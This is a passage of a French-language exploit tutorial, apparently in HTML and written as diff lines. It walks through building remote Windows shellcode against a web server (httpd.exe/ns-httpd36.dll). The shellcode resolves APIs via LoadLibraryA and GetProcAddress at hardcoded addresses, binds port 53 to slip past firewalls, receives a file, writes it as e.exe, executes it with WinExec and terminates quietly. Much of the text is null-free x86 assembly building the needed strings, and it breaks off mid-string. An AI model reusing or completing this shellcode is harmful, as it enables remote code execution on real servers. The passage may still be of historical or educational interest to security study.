+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Maintenant, l'affaire 
+  va se corser s&eacute;rieusement. <br>
+  J'explique pourquoi. En fait, dans l'exemple pr&eacute;c&eacute;dent, on a utilis&eacute; 
+  1 seule fonction. C'&eacute;tait "system". Or, on ne connaissait pas l'adresse 
+  de cette fonction. Mais en local, ce n'est pas un probl&egrave;me car on peut 
+  ouvrir le fichier DLL qui contient la fonction et regarder &agrave; quelle offset 
+  elle se trouve. Rien de plus facile. Cependant, l&agrave;, on est en remote. 
+  Pour pouvoir appeller une fonction, hors de question de l'appeller par une adresse 
+  qu'on a choisit (=hardcoded) Car les adresses des fonctions utilis&eacute;es 
+  changent selon l'OS, la version, l'installation, les updates fa&icirc;tes, bref, 
+  c'est le vrai bordel. Comment allons-nous donc nous en sortir pour cona&icirc;tre 
+  les adresses des fonctions ? Et bien c'est simple, on va utiliser 2 fonctions, 
+  <font color="#FF0000">LoadLibraryA</font> et <font color="#FF0000">GetProcAddress</font></font><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif" size="2">.<font color="#000000"> 
+  LoadLibraryA va nous permettre de... disons... loader une DLL ;) et GetProcAddress 
+  va nous permettre de conna&icirc;tre l'adresse de chaque fonction contenue dans 
+  cette Dynamic Link Library. Je vous balance la syntaxe :</font></font> 
+<p><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>HINSTANCE 
+  LoadLibrary(</tt> </font>
+<p><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp; 
+  LPCTSTR lpLibFileName&nbsp; // address of filename of executable module</tt> 
+  <br>
+  <tt>&nbsp;&nbsp; );</tt> </font>
+<p><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>FARPROC 
+  GetProcAddress(</tt> </font>
+<p><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>&nbsp;&nbsp;&nbsp; 
+  HMODULE hModule,&nbsp;&nbsp; // handle to DLL module</tt> <br>
+  <tt>&nbsp;&nbsp;&nbsp; LPCSTR lpProcName&nbsp; // name of function</tt> <br>
+  <tt>&nbsp;&nbsp; );</tt> </font>
+<p><font color="#000000" face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila. 
+  Le principe</font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> 
+  est le suivant. Admettons que j'ai la cha&icirc;ne "kernel32.dll" en m&eacute;moire, 
+  point&eacute;e par PTR (avec un NULL). <br>
+  On va faire, <br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LibHandle=LoadLibraryA(PTR); 
+  <br>
+  Ensuite, si on a "CreateProcess" termin&eacute;e par un caract&egrave;re NULL 
+  &eacute;galement, point&eacute;e par PTR2. <br>
+  On va faire, sous r&eacute;serve que LibHandle ne soit pas NULL, </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  addr=GetProcAddress(LibHandle,PTR2); </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Et l&agrave;, addr 
+  contiendra l'adresse de la fonction "CreateProcess" du module "kernel32.dll", 
+  En appellant cette adresse, on appelle la fonction. C'est pas beau &ccedil;a 
+  ? <br>
+  L'interet ? Et bien on va cr&eacute;er ce qu'on appelle une jump table (voir 
+  article de DilDog la dessus). En fait, un fichier executable, a une jump table 
+  au d&eacute;but qui lui permet d'appeller les fonctions en faisant un call vers 
+  sa jump table. Et bien on va faire de m&ecirc;me ici :) <br>
+  On gros il faut que l'on ait, quelque part en m&eacute;moire, les adresses des 
+  fonctions que l'on va utiliser. <br>
+  Reste un petit souci, celui des fonctions GetProcAddress et LoadLibraryA... 
+  et oui... comment conna&icirc;tre leur adresse si pour la conna&icirc;tre il 
+  faut les appeller, sachant qu'on ne peut les appeller sans leur adresse... etc...etc... 
+  C'est &agrave; devenir fou &agrave; lier. <br>
+  En fait, on est quasiment sur que le programme va les utiliser, elles r&eacute;sident 
+  donc dans sa jump table. On d&eacute;compile le prog "httpd.exe" et on recherche 
+  "LoadLibraryA" par exemple. Mais on ne la trouve pas. Bon, d'accord, le prog 
+  n'utilise pas cette fonction. Ce n'est rien, on d&eacute;compile une DLL que 
+  le prog utilise forcement, &agrave; savoir E:\winnt\system32\ns-httpd36.dll 
+  <br>
+  On d&eacute;compile cette DLL et on constate qu'elle exporte nos deux fonctions 
+  &agrave; : </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><tt>GetProcAddress&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  :100E770C hex</tt> <br>
+  <tt>LoadLibraryA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :100E7710 
+  hex</tt> </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Voila. On va pouvoir 
+  charger toutes les addresses des fonctions que l'on veut ! <br>
+  Je le dit tout de suite, je m'inspire pour l'exploit d'un exploit de _rix&nbsp; 
+  (bonjour &agrave; toi,_rix&nbsp; en passant :) <br>
+  Le principe est le suivant : <br>
+  On va ouvrir un port, attendre une connection, t&eacute;l&eacute;charger un 
+  fichier qu'on nous envoi par ce port, et executer ce fichier. <br>
+  C'est un grand classique des exploits, &ccedil;a plait beaucoup :) <br>
+  Ou va choisir le port 53. Pourquoi ? Parce que c'est un port non filtr&eacute; 
+  par un firewall en g&eacute;n&eacute;ral, et qui me plait bien ;) <br>
+  Il nous faudra les fonctions suivantes pour &eacute;tablir et utiliser une connexion 
+  : <br>
+  <font color="#FFCC00">socket&nbsp;&nbsp;&nbsp; listen&nbsp;&nbsp;&nbsp; bind&nbsp;&nbsp;&nbsp; 
+  accept&nbsp;&nbsp;&nbsp; recv&nbsp;&nbsp;&nbsp; closesocket&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></font><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp; 
+  (Elles sont dans wsock32.dll)</font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  Il nous faudra ces fonctions pour g&eacute;rer le fichier, l'executer... <br>
+  <font color="#FFCC33">_lcreat&nbsp;&nbsp;&nbsp; _lwrite&nbsp;&nbsp;&nbsp; _lclose&nbsp;&nbsp;&nbsp; 
+  WinExec</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  Ces fonctions permettent de terminer le programme discr&egrave;tement... <br>
+  <font color="#FFCC33">GetCurrentProcess&nbsp;&nbsp;&nbsp; TerminateProcess</font></font> 
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  On aura &eacute;gelement besoin de GlobalAlloc pour avoir un peu de m&eacute;moire 
+  pour mettre diverses valeurs. <br>
+  Toutes ces fonctions sont export&eacute;es par Kernel32.dll </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On aura donc besoin 
+  ce toutes ces cha&icirc;nes de caract&egrave;res : <br>
+  <font color="#CC00CC">"kernel32.dll","GLobalAlloc",TerminateProcess","GetCurrentProcess","WinExec","_lcreat","_lwrite","_lclose"</font></font> 
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#CC00CC">"wsock32.dll","socket","bind","listen","accept","recv","closesocket"</font></font> 
+  <font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  <font color="#CC00CC">"e.exe"</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="2">&lt;- 
+  c'est le nom du fichier .exe qu'on va lancer (on le cr&eacute;&eacute; puis 
+  on l'execute) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">On va donc, pour 
+  plus de portabilit&eacute;, copier toutes ces cha&icirc;nes en m&eacute;moire, 
+  caract&egrave;re par caract&egrave;re. C'est laborieux, je sais, mais au moins, 
+  on sait ou on les mets avec pr&eacute;cisions :)) <br>
+  Pendant l'execution du programme, j'ai vu qu'il se servait de la zone m&eacute;moire 
+  aux alentours de 0x00CE15??. On peut par exemple copier nos cha&icirc;ne &agrave; 
+  cet endroit. <br>
+  Au fait, on doit mettre un 0 &agrave; chaque fin de cha&icirc;ne. Je met donc 
+  un 22h (ou n'importe quoi) puis je xor le 22h par un 22h ce qui &agrave; pour 
+  effet de mettre &agrave; 0 le byte en m&eacute;moire ok ? car NB XOR NB = NULL 
+  <br>
+  Bon c parti pour le d&eacute;but :) </font>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp; <tt><font color="#33CCFF">mov 
+  ebx,not 00CE1528h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#33FF33"> 
+  // on met tout &agrave; partir de cette adresse (ou une autre)</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;not ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#00CC00"> 
+  </font><font color="#33FF33">// les not sont pour &eacute;viter le 00</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Bh ;k&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#33FF33">&nbsp;&nbsp;&nbsp; 
+  // on place le "k" &agrave; 0x00CE1528</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#33FF33">&nbsp; 
+  // incr&eacute;mente ebx, ebx=0x00CE1529</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><font color="#33FF33">&nbsp; 
+  // on place le "e" &agrave; 0x00CE1529</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+  </font><font color="#33FF33">// et ainsi de suite...</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],33h ;3</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],32h ;2</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],2Eh ;.</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],64h ;d</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],47h ;G</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],62h ;b</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],61h ;a</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],41h ;A</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],54h ;T</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Dh ;m</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],69h ;i</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],61h ;a</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],50h ;P</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],47h ;G</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],43h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],75h ;u</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],50h ;P</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],57h ;W</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],69h ;i</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Eh ;n</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],45h ;E</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],78h ;x</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],5Fh ;_</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],61h ;a</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],5Fh ;_</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],77h ;w</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],72h ;r</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],69h ;i</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],74h ;t</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],5Fh ;_</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],65h ;e</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22h ;NULL</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22h</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],77h ;w</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Bh ;k</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],33h ;3</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],32h ;2</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],2Eh ;.</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],64h ;d</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Ch ;l</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],22&nbsp; ;NULL</font></tt> 
+  <br>
+  <tt><font color="#33CCFF">&nbsp;xor byte ptr [ebx],22</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],73h ;s</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],6Fh ;o</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;mov byte ptr [ebx],63h ;c</font></tt> <br>
+  <tt><font color="#33CCFF">&nbsp;inc ebx</font></tt> <br>
